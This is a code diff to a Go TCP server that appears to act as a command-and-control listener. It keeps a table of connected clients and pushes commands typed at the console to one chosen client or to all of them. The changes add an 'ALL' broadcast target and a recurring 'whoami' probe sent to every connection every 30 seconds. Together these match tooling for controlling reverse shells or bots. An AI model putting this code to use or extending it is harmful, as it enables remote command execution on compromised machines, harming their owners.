@@ -31,18 +31,23 @@ func inArray(need string, needArr []string) bool {
 	return false
 }
 
-func sendCommand(conn *net.TCPConn, cmd string) {
+func sendCommand(conn *net.TCPConn, cmd string, STDlog int) {
 	n, err := conn.Write([]byte(cmd))
 	if err != nil {
 		log.Println(err)
+		fmt.Println("delete conn: ", conn.RemoteAddr().String())
+		delete(M_conn, conn.RemoteAddr().String())
 		conn.Close()
 		return
 	}
-	fmt.Printf("send %d bytes to %s\n", n, conn.RemoteAddr())
+	if STDlog == 1 {
+		fmt.Printf("send %d bytes to %s\n", n, conn.RemoteAddr())
+	}
 }
 
 func connHandler(conn *net.TCPConn) {
 	tick := time.Tick(3 * time.Second)
+
 	for now := range tick {
 		if globalCommand == "" {
 			continue
@@ -53,11 +58,19 @@ func connHandler(conn *net.TCPConn) {
 		var cmd = strings.Join(arr[1:], " ")
 		var host_port_ = conn.RemoteAddr().String()
 		var port_ = strings.Split(host_port_, ":")[1]
-		if _port == port_ && cmd != M[_port] {
+		if (_port == "ALL" || _port == port_) && cmd != M[_port] {
 			fmt.Println(dt(now))
-			sendCommand(conn, cmd)
+			sendCommand(conn, cmd, 1)
 			M[_port] = cmd
 		}
+	}
+}
+
+func healthCheck(conn *net.TCPConn) {
+	tick := time.Tick(30 * time.Second)
+	for now := range tick {
+		fmt.Println(dt(now))
+		sendCommand(conn, "whoami", 0)
 	}
 }
 
@@ -77,14 +90,14 @@ func reply(conn *net.TCPConn) {
 	}
 }
 
-var globalCommand = ""
+var globalCommand = "ALL whoami"
 var M = make(map[string]string)
-var S = []string{}
+var M_conn = make(map[string]string)
 
 func globalInputScopeControl() {
 	tick := time.Tick(2 * time.Second) // 五秒的心跳间隔
 	for now := range tick {
-		fmt.Println(dt(now), S)
+		fmt.Println(dt(now), M_conn)
 		globalCommand = stdinput()
 	}
 }
@@ -108,9 +121,10 @@ func main() {
 			log.Fatal(err) // 错误直接退出
 		}
 		fmt.Println("remote address:", conn.RemoteAddr())
-		S = append(S, conn.RemoteAddr().String())
+		M_conn[conn.RemoteAddr().String()] = "open"
 		go globalInputScopeControl()
 		go connHandler(conn)
+		go healthCheck(conn)
 		go reply(conn)
 	}
 }
